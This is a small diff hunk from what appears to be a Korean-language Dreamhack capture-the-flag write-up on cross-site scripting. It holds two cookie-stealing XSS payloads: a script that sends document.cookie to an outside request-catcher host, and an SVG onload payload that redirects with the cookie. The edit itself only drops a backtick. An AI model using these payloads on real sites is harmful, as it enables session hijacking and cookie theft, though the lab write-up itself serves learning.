@@ -136,7 +136,7 @@
     <script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>
 
 
-`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>`
+`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>
 
     SVG 태그는 벡터 그래픽을 표현할 때 사용되는 데 이 태그를 이용하여 XSS 
     테스트가 가능하다.
